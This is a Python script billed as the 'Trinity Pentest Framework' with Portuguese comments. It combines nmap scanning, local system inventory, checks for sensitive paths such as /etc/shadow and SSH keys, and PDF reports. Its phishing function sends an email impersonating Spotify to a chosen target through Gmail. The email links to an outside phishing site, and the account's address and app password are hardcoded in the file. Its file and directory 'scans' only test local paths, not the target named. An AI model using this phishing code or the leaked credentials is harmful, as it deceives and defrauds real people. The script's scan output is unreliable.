import argparse
import socket
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from fpdf import FPDF
from datetime import datetime
import scapy.all as scapy
import nmap
import os
import tempfile
import platform
import psutil
import sqlite3
import shutil

# Função para exibir o logo do script
def show_logo():
    logo = r"""

 ________   ______      _____      __      _    _____   ________  __      __ 
(___  ___) (   __ \    (_   _)    /  \    / )  (_   _) (___  ___) ) \    / ( 
    ) )     ) (__) )     | |     / /\ \  / /     | |       ) )     \ \  / /  
   ( (     (    __/      | |     ) ) ) ) ) )     | |      ( (       \ \/ /   
    ) )     ) \ \  _     | |    ( ( ( ( ( (      | |       ) )       \  /    
   ( (     ( ( \ \_))   _| |__  / /  \ \/ /     _| |__    ( (         )(     
   /__\     )_) \__/   /_____( (_/    \__/     /_____(    /__\       /__\    
                                                                             

             Trinity Pentest Framework
             By: N3ro

    """
    print(logo)

# Função para obter o IP do alvo
def get_target_ip_from_user():
    target_ip = input("Informe o IP ou domínio do alvo: ")
    try:
        ip = socket.gethostbyname(target_ip)
        print(f"IP do alvo: {ip}")
        return ip
    except socket.gaierror:
        print("Erro ao resolver o nome do host. Certifique-se de que o domínio está correto.")
        return None

# Função de Phishing (-p)
def phishing_attack():
    target_email = input("Informe o endereço de email do alvo para o phishing: ")
    print("[Phishing] Enviando email de phishing...")

    # Configuração do email
    sender_email = "gabowoitovetch09@gmail.com"
    sender_password = "gsiv bmtq kput dayo"
    subject = "Confira sua nova playlist do Spotify!"
    phishing_link = "http://playlist-spotify.fwh.is"

    # Corpo do email
    body = f"Olá,\n\nConfira sua nova playlist personalizada do Spotify clicando no link abaixo:\n{phishing_link}\n\nAproveite!"

    message = MIMEMultipart()
    message['From'] = sender_email
    message['To'] = target_email
    message['Subject'] = subject
    message.attach(MIMEText(body, 'plain'))

    try:
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as server:
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, target_email, message.as_string())
        print(f"[Phishing] Email enviado com sucesso para {target_email}.")
    except Exception as e:
        print(f"[Phishing] Erro ao enviar email: {e}")

# Função de Reconhecimento (-r)
def reconnaissance(target_ip):
    print("[Reconhecimento] Iniciando reconhecimento...")

    nm = nmap.PortScanner()

    try:
        print("[Reconhecimento] Escaneando portas e serviços...")
        nm.scan(hosts=target_ip, arguments='-sV')

        recon_info = []
        for host in nm.all_hosts():
            recon_info.append(f"Host: {host}")
            for proto in nm[host].all_protocols():
                recon_info.append(f"Protocolo: {proto}")
                ports = nm[host][proto].keys()
                for port in ports:
                    service = nm[host][proto][port]['name']
                    version = nm[host][proto][port].get('version', 'N/A')
                    recon_info.append(f"Porta: {port}, Serviço: {service}, Versão: {version}")
        
        return recon_info
    except Exception as e:
        print(f"[Reconhecimento] Erro: {e}")
        return []

# Função de coleta de informações do sistema e rede
def collect_system_info():
    system_info = {}
    
    # Nome do sistema operacional
    system_info['OS'] = platform.system() + " " + platform.version()
    
    # Arquitetura do sistema
    system_info['Architecture'] = platform.architecture()
    
    # Nome do computador
    system_info['Hostname'] = socket.gethostname()
    
    # Endereço IP
    system_info['IP Address'] = socket.gethostbyname(socket.gethostname())
    
    # Informações do processador
    system_info['CPU'] = platform.processor()
    
    # Memória RAM
    system_info['Memory'] = psutil.virtual_memory().total
    
    # Usuários logados
    system_info['Logged Users'] = os.getlogin()
    
    # Processos em execução
    system_info['Processes'] = [p.info for p in psutil.process_iter(['pid', 'name', 'username'])]
    
    return system_info

def collect_network_info():
    network_info = []
    
    # Obter todas as conexões de rede ativas
    for conn in psutil.net_connections(kind='inet'):
        network_info.append({
            'local_address': conn.laddr,
            'remote_address': conn.raddr,
            'status': conn.status
        })
    
    return network_info

# Função de varredura de arquivos sensíveis (-f)
def scan_sensitive_files(target_ip):
    print("[Varredura de Arquivos] Iniciando varredura de arquivos sensíveis...")

    sensitive_files = []
    common_log_files = [
        "/var/log/auth.log", "/var/log/syslog", "/var/log/messages", 
        "/var/log/apache2/access.log", "/var/log/apache2/error.log"
    ]
    
    # Se o alvo for Windows, podemos procurar logs do Event Viewer
    if platform.system() == 'Windows':
        common_log_files.extend([ 
            "C:\\Windows\\System32\\winevt\\Logs\\Security.evtx",
            "C:\\Windows\\System32\\winevt\\Logs\\Application.evtx"
        ])
    
    # Caminhos comuns de arquivos de senhas
    sensitive_file_paths = [
        "/etc/passwd", "/etc/shadow", "/etc/ssl/private", "/etc/ssl/certs", 
        os.path.expanduser("~/.bash_history"), os.path.expanduser("~/.ssh/authorized_keys")
    ]
    
    # Buscar por arquivos de log
    for log_file in common_log_files:
        if os.path.exists(log_file):
            sensitive_files.append(f"[Log] Encontrado: {log_file}")

    # Buscar por arquivos que podem conter senhas
    for sensitive_file in sensitive_file_paths:
        if os.path.exists(sensitive_file):
            sensitive_files.append(f"[Senha] Encontrado: {sensitive_file}")
    
    return sensitive_files

# Função de busca e relatório de diretórios (-d)
def scan_directories(target_ip):
    print("[Varredura de Diretórios] Iniciando busca por diretórios...")

    directories_found = []
    common_directories = [
        "/home", "/etc", "/var", "/usr", "/root", "/tmp", "/opt", 
        "C:\\Program Files", "C:\\Windows", "C:\\Users"
    ]
    
    for directory in common_directories:
        if os.path.exists(directory):
            directories_found.append(f"Diretório encontrado: {directory}")
    
    return directories_found

# Função para gerar o relatório PDF
def create_pdf_report(system_info, network_info, passwords, recon_info, sensitive_files, directories, report_name):
    pdf = FPDF()
    pdf.set_auto_page_break(auto=True, margin=15)
    pdf.add_page()
    
    # Título
    pdf.set_font('Arial', 'B', 16)
    pdf.cell(200, 10, 'Relatório do Pentest', ln=True, align='C')
    pdf.ln(10)
    
    # Data e Hora
    pdf.set_font('Arial', '', 12)
    pdf.cell(200, 10, f"Data: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", ln=True)
    pdf.ln(10)

    # Informações do Sistema
    pdf.set_font('Arial', 'B', 12)
    pdf.cell(200, 10, 'Informações do Sistema', ln=True)
    pdf.set_font('Arial', '', 12)
    
    for key, value in system_info.items():
        pdf.cell(200, 10, f"{key}: {value}", ln=True)
    
    pdf.ln(10)

    # Informações de Rede
    pdf.set_font('Arial', 'B', 12)
    pdf.cell(200, 10, 'Conexões de Rede', ln=True)
    pdf.set_font('Arial', '', 12)
    
    for conn in network_info:
        pdf.cell(200, 10, f"Local: {conn['local_address']} - Remoto: {conn['remote_address']} - Status: {conn['status']}", ln=True)

    pdf.ln(10)

    # Senhas do Chrome ou outros arquivos
    pdf.set_font('Arial', 'B', 12)
    pdf.cell(200, 10, 'Arquivos Sensíveis Encontrados', ln=True)
    pdf.set_font('Arial', '', 12)
    
    if sensitive_files:
        for file in sensitive_files:
            pdf.cell(200, 10, file, ln=True)
    else:
        pdf.cell(200, 10, "Nenhum arquivo sensível encontrado.", ln=True)

    pdf.ln(10)

    # Diretórios encontrados
    pdf.set_font('Arial', 'B', 12)
    pdf.cell(200, 10, 'Diretórios Encontrados', ln=True)
    pdf.set_font('Arial', '', 12)
    
    if directories:
        for dir in directories:
            pdf.cell(200, 10, dir, ln=True)
    else:
        pdf.cell(200, 10, "Nenhum diretório encontrado.", ln=True)

    pdf.ln(10)

    # Informações de Reconhecimento
    pdf.set_font('Arial', 'B', 12)
    pdf.cell(200, 10, 'Reconhecimento do Alvo', ln=True)
    pdf.set_font('Arial', '', 12)
    
    for line in recon_info:
        pdf.cell(200, 10, line, ln=True)

    # Salvar PDF
    pdf_output_path = os.path.join(tempfile.gettempdir(), f'{report_name}.pdf')
    pdf.output(pdf_output_path)
    print(f"[Payload] Relatório gerado com sucesso em: {pdf_output_path}")

# Função Principal
def main():
    parser = argparse.ArgumentParser(description="Red Team Attack Framework")
    parser.add_argument("-p", "--phishing", action="store_true", help="Enviar email de phishing para o email especificado")
    parser.add_argument("-r", "--recon", action="store_true", help="Realizar reconhecimento do alvo")
    parser.add_argument("-f", "--file-scan", action="store_true", help="Realizar varredura de arquivos sensíveis")
    parser.add_argument("-d", "--dir-scan", action="store_true", help="Buscar e relatar diretórios")
    parser.add_argument("-i", "--ip", type=str, help="IP ou domínio do alvo")
    args = parser.parse_args()

    show_logo()

    # Obter IP do alvo
    target_ip = args.ip if args.ip else get_target_ip_from_user()

    system_info = collect_system_info()
    network_info = collect_network_info()

    recon_info = []  # Inicializando recon_info
    sensitive_files = []  # Inicializando sensitive_files
    directories = []  # Inicializando directories

    if args.phishing:
        phishing_attack()

    if args.recon:
        if not target_ip:
            print("[Erro] IP ou domínio do alvo não fornecido para reconhecimento.")
        else:
            recon_info = reconnaissance(target_ip)
            print("[Reconhecimento] Informações coletadas:", recon_info)
            create_pdf_report(system_info, network_info, None, recon_info, sensitive_files, directories, "recon_report")

    if args.file_scan:
        if not target_ip:
            target_ip = get_target_ip_from_user()
        sensitive_files = scan_sensitive_files(target_ip)
        print("[Varredura de Arquivos] Arquivos sensíveis encontrados:")
        for file in sensitive_files:
            print(file)
        create_pdf_report(system_info, network_info, None, recon_info, sensitive_files, directories, "file_scan_report")

    if args.dir_scan:
        directories = scan_directories(target_ip)
        print("[Varredura de Diretórios] Diretórios encontrados:")
        for dir in directories:
            print(dir)
        create_pdf_report(system_info, network_info, None, recon_info, sensitive_files, directories, "dir_scan_report")

if __name__ == "__main__":
    main()
